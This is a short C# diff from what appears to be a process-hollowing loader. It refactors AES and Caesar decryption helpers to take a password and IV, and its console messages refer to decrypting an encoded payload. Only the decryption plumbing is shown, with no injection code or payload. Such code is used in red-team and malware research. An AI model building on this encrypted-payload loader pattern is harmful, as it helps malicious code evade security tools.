@@ -9,7 +9,7 @@ namespace ProcessHollowingExe
     public class PFuncs
     {
 
-        private static byte[] AesDecrypt(byte[] input)
+        private static byte[] AesDecrypt(byte[] input, string password, byte[] iv)
         {
             try
             {
@@ -35,10 +35,10 @@ namespace ProcessHollowingExe
             }
         }
 
-        public static byte[] CaesarDecrypt(byte[] buffer)
+        public static byte[] CaesarDecrypt(byte[] buffer,string password, byte[] iv)
         {
             Console.WriteLine($"[+] Decrypting AES Payload.");
-            var decrypted = AesDecrypt(buffer);
+            var decrypted = AesDecrypt(buffer, password, iv);
 
             Console.WriteLine($"[+] Decoding Caesar Encoded Payload.");
             var decoded = new byte[decrypted.Length];
